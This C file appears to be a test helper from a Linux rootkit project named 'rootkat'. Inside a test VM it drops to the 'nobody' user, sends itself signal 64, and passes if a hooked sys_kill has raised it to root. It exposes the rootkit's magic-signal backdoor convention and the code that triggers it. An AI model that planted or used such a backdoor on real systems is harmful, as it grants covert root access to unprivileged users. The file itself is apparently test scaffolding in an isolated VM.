// SPDX-License-Identifier: MIT
/*
 * Helper invoked from inside the QEMU test VM. Drops to the `nobody`
 * user, sends the rootkat magic signal to itself, and checks that euid
 * was elevated to 0. Exits 0 on successful privesc, nonzero otherwise.
 *
 * Built statically inside the rootkat-build container; runs in the VM
 * with the rootkat module loaded and the sys_kill hook installed.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <grp.h>
#include <pwd.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define ROOTKAT_MAGIC_SIG 64

int main(void)
{
	struct passwd *nobody = getpwnam("nobody");
	if (!nobody) {
		fprintf(stderr, "getpwnam(nobody): %s\n", strerror(errno));
		return 1;
	}

	if (setgroups(0, NULL) != 0) {
		fprintf(stderr, "setgroups: %s\n", strerror(errno));
		return 1;
	}
	if (setregid(nobody->pw_gid, nobody->pw_gid) != 0) {
		fprintf(stderr, "setregid: %s\n", strerror(errno));
		return 1;
	}
	if (setreuid(nobody->pw_uid, nobody->pw_uid) != 0) {
		fprintf(stderr, "setreuid: %s\n", strerror(errno));
		return 1;
	}

	fprintf(stderr, "[before] uid=%u euid=%u\n", getuid(), geteuid());
	if (geteuid() != nobody->pw_uid) {
		fprintf(stderr, "FAIL: setreuid did not stick\n");
		return 1;
	}

	if (kill(getpid(), ROOTKAT_MAGIC_SIG) < 0) {
		fprintf(stderr, "kill: %s\n", strerror(errno));
		return 1;
	}

	fprintf(stderr, "[after]  uid=%u euid=%u\n", getuid(), geteuid());
	if (geteuid() != 0) {
		fprintf(stderr, "FAIL: still not root after magic signal\n");
		return 1;
	}

	fprintf(stderr, "PASS: privesc via magic signal\n");
	return 0;
}
